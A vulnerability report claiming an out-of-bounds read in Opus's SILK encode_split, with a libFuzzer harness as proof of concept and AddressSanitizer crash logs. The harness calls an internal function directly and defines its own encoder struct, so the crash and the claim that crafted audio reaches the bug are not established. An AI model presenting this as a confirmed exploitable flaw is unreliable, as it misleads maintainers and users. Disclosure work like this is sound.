# Vulnerability Report: Out-of-bounds Read in Opus SILK `encode_split`

## 1. Vulnerability Description

An **Out-of-bounds (OOB) Read** vulnerability was identified in the **Opus Audio Codec** within the SILK component's shell coding logic. The function `encode_split` in `silk/shell_coder.c` uses an input-controlled variable `p` to index the `silk_shell_code_table_offsets` array without proper boundary validation. When `p` exceeds the maximum supported pulse count, the application performs an out-of-bounds memory access, leading to a segmentation fault (SEGV) and potential Denial of Service (DoS).

## 2. Technical Analysis

### Root Cause

The vulnerability stems from a lack of input validation in the data processing pipeline. The signal pulses are passed through `silk_shell_encoder` into the `encode_split` function.

In `silk/shell_coder.c`, the function is implemented as follows:

```c
static OPUS_INLINE void encode_split(
    ec_enc *psRangeEnc,
    const opus_int p_child1,
    const opus_int p,
    const opus_uint8 *shell_table
) {
    if( p > 0 ) {
        // VULNERABILITY: p is used to index silk_shell_code_table_offsets
        ec_enc_icdf(psRangeEnc, p_child1, &shell_table[ silk_shell_code_table_offsets[ p ] ], 8);
    }
}

```

The array `silk_shell_code_table_offsets` is defined in `silk/tables_pulses_per_block.c` with a fixed size of **17** (`SILK_MAX_PULSES + 1`):

```c
const opus_uint8 silk_shell_code_table_offsets[ 17 ] = { ... };

```

If the input pulse value `p` is greater than **16**, the expression `silk_shell_code_table_offsets[p]` accesses memory outside the array's bounds. This illegal offset is then used to index `shell_table`, resulting in a SEGV.

### Crash Trace

The crash occurs at the following location:

* **File:** `/src/opus/silk/shell_coder.c`
* **Function:** `encode_split`
* **Operation:** `READ of size 1` at an illegal offset.

## 3. Impact

* **Vulnerability Type:** CWE-125 (Out-of-bounds Read)
* **Attack Vector:** An attacker providing specially crafted audio data or malformed internal pulse parameters can trigger this crash.
* **Impact:**
* **Denial of Service (DoS):** The primary impact is an immediate crash of the Opus encoder/decoder process.
* **Information Leak:** In certain configurations, OOB reads can potentially be used to leak sensitive memory contents, though DoS is the most likely outcome here.



## 4. Proof of Concept (PoC)
```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <stddef.h>

typedef int32_t opus_int;

typedef struct {
    uint8_t buffer[4096];
    size_t pos;
} ec_enc;

void silk_shell_encoder(ec_enc *psRangeEnc, opus_int pulses[]);
void ec_enc_done(ec_enc *psRangeEnc);

int LLVMFuzzerTestOneInput(const uint8_t *Data, size_t DataSize) {
    opus_int pulses0[16] = {0};
    size_t copy_size = DataSize < sizeof(pulses0) ? DataSize : sizeof(pulses0);
    memcpy(pulses0, Data, copy_size);

    ec_enc psRangeEnc = {
        .buffer = {0},
        .pos = 0
    };

    silk_shell_encoder(&psRangeEnc, pulses0);
    ec_enc_done(&psRangeEnc);

    return 0;
}

```

## 5. Crash Output
```
INFO:__main__:Running: docker run --privileged --shm-size=2g --platform linux/amd64 --rm -e FUZZING_ENGINE=libfuzzer -e SANITIZER=address -e RUN_FUZZER_MODE=interactive -e HELPER=True -v /data/huangzikang/driver_test_data/opus/corpus/silk_shell_encoder-output-2-regen1/opus_repacketizer_fuzzer_fixed:/tmp/opus_repacketizer_fuzzer_fixed_corpus -v /data/huangzikang/uploadfile/oss-fuzz/build/out/silk_shell_encoder-output-2-regen1:/out -t gcr.io/oss-fuzz-base/base-runner run_fuzzer opus_repacketizer_fuzzer_fixed -runs=100000 -max_total_time=300 -detect_leaks=0 -print_final_stats=1 -len_control=0.
vm.mmap_rnd_bits = 28
rm: cannot remove '/tmp/opus_repacketizer_fuzzer_fixed_corpus': Device or resource busy
Using seed corpus: opus_repacketizer_fuzzer_fixed_seed_corpus.zip
/out/opus_repacketizer_fuzzer_fixed -rss_limit_mb=2560 -timeout=25 -runs=100000 -max_total_time=300 -detect_leaks=0 -print_final_stats=1 -len_control=0 /tmp/opus_repacketizer_fuzzer_fixed_corpus < /dev/null
INFO: Running with entropic power schedule (0xFF, 100).
INFO: Seed: 2428437953
INFO: Loaded 1 modules   (326 inline 8-bit counters): 326 [0x55f9db977048, 0x55f9db97718e), 
INFO: Loaded 1 PC tables (326 PCs): 326 [0x55f9db977190,0x55f9db9785f0), 
INFO:       24 files found in /tmp/opus_repacketizer_fuzzer_fixed_corpus
INFO: -max_len is not provided; libFuzzer will not generate inputs larger than 1048576 bytes
INFO: seed corpus: files: 24 min: 56702b max: 6145920b total: 65091562b rss: 31Mb
AddressSanitizer:DEADLYSIGNAL
=================================================================
==12==ERROR: AddressSanitizer: SEGV on unknown address 0x55f9f7ea194f (pc 0x55f9db90e615 bp 0x7fffab912730 sp 0x7fffab9126c0 T0)
==12==The signal is caused by a READ memory access.
SCARINESS: 20 (wild-addr-read)
    #0 0x55f9db90e615 in encode_split /src/opus/silk/shell_coder.c:56:58
    #1 0x55f9db90e615 in silk_shell_encoder /src/opus/silk/shell_coder.c:104:5
    #2 0x55f9db9095d2 in LLVMFuzzerTestOneInput /src/opus/tests/opus_repacketizer_fuzzer.c:31:5
    #3 0x55f9db7c0300 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:614:13
    #4 0x55f9db7bfb25 in fuzzer::Fuzzer::RunOne(unsigned char const*, unsigned long, bool, fuzzer::InputInfo*, bool, bool*) /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:516:7
    #5 0x55f9db7c1ab2 in fuzzer::Fuzzer::ReadAndExecuteSeedCorpora(std::__Fuzzer::vector<fuzzer::SizedFile, std::__Fuzzer::allocator<fuzzer::SizedFile>>&) /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:829:7
    #6 0x55f9db7c1da2 in fuzzer::Fuzzer::Loop(std::__Fuzzer::vector<fuzzer::SizedFile, std::__Fuzzer::allocator<fuzzer::SizedFile>>&) /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:867:3
    #7 0x55f9db7b0edb in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:914:6
    #8 0x55f9db7dc2b2 in main /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerMain.cpp:20:10
    #9 0x7f5585826082 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x24082) (BuildId: 0323ab4806bee6f846d9ad4bccfc29afdca49a58)
    #10 0x55f9db7a375d in _start (/out/opus_repacketizer_fuzzer_fixed+0x3e75d)

DEDUP_TOKEN: encode_split--silk_shell_encoder--LLVMFuzzerTestOneInput
AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV /src/opus/silk/shell_coder.c:56:58 in encode_split
==12==ABORTING
MS: 0 ; base unit: 0000000000000000000000000000000000000000
artifact_prefix='./'; Test unit written to ./crash-338c3f1b4b97226bc60bc41038becbc6de06b28f
stat::number_of_executed_units: 2
stat::average_exec_per_sec:     0
stat::new_units_added:          0
stat::slowest_unit_time_sec:    0
stat::peak_rss_mb:              33

```

